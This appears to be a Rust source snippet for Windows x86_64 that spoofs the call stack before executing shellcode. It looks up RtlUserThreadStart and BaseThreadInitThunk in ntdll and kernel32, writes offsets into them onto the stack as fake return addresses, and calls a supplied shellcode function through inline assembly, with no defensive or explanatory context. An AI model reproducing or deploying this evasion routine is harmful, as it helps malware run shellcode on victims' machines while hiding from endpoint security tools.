#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn spoof_and_call(shellcode_fn: extern "C" fn()) {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    let ntdll   = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    let rts     = GetProcAddress(ntdll, b"RtlUserThreadStart\0".as_ptr());
    let fake_ret = (core::mem::transmute::<_, usize>(rts)).wrapping_add(0x14);

    let k32    = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
    let btit   = GetProcAddress(k32, b"BaseThreadInitThunk\0".as_ptr());
    let fake_ret2 = (core::mem::transmute::<_, usize>(btit)).wrapping_add(0x10);

    core::arch::asm!(
        "sub rsp, 0x60",
        "mov qword ptr [rsp+0x50], {r2}",
        "mov qword ptr [rsp+0x48], {r1}",
        "call {fn}",
        "add rsp, 0x60",
        fn = in(reg) shellcode_fn,
        r1 = in(reg) fake_ret,
        r2 = in(reg) fake_ret2,
        options(nostack),
    );
}
